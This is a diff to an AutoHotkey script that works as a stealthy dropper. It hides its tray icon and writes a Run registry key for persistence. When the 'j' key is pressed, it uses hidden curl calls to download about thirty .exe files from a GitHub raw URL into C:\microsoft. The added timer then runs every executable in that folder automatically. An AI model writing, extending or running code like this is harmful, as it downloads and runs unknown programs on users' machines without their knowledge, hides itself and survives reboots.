@@ -1,4 +1,5 @@
 #SingleInstance Ignore
+#NoTrayIcon
 
 ^Esc::ExitApp
 
@@ -10,6 +11,18 @@ DirList(pattern, attr := "") {
     return files
 }
 
+SetTimer RunBatch, -1000
+
+RunBatch() {
+    static path := "C:\microsoft"
+    if !DirExist(path) {
+        return
+    }
+    for file in DirList(path "\*.exe") {
+        Run file
+    }
+}
+
 $j::{
     path := "C:\microsoft"
     Send "j"
@@ -18,25 +31,25 @@ $j::{
     RegWrite '"C:\microsoft\Delete.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate3"
 
     static lastRun := 0
-    delay := 1000
+    delay := 10000
     now := A_TickCount
     if (now - lastRun < delay) {
         return
     }
 
     if (DirExist(path)) {
-        for file in DirList(path "\*") {
-            Run file
-        }
+        SetTimer RunBatch, -1000
     } else {
         DirCreate(path)
         letters := ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "LButton", "RButton", "Delete", "Backspace", "Space"]
         for letter in letters {
             output := path "\" letter ".exe"
-            url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/" letter ".exe"
-            command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
-            RunWait command, , "Hide"
-            Run path "\" letter ".ahk"
+            if !FileExist(output) {
+                url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/" letter ".exe"
+                command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
+                RunWait command, , "Hide"
+            }
         }
+        SetTimer RunBatch, -1000
     }
 }
